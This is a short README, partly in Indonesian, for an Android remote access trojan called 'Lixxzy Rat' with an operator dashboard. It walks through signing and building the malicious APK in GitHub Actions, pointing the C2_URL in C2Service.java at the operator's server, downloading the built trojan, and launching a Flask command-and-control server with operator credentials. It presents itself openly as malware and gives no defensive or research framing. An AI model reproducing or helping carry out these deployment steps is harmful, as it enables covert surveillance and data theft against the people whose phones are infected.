# Lixxzy Rat

Android RAT + Operator dashboard.

## Setup GitHub Actions
1. Jalankan `chmod +x keystore.sh && ./keystore.sh` di lokal. Copy output base64-nya.
2. Buka repo GitHub, masuk ke **Settings > Secrets and variables > Actions**:
   - `KEYSTORE_B64` (hasil copy tadi)
   - `KEYSTORE_PASS` = `changeme`
   - `KEY_ALIAS` = `lixxzy`
   - `KEY_PASS` = `changeme`
3. Edit `app/src/main/java/com/r/rat/C2Service.java`, ganti `C2_URL` ke domain/IP server kamu.
4. Push ke branch `main`.
5. Cek tab **Actions**, download artifact `lixxzy-rat-apk`.

## Setup C2 Server
```bash
pip install flask flask-socketio
OP_EMAIL=op@lixxzy.local OP_PASS=changeme123 python c2.py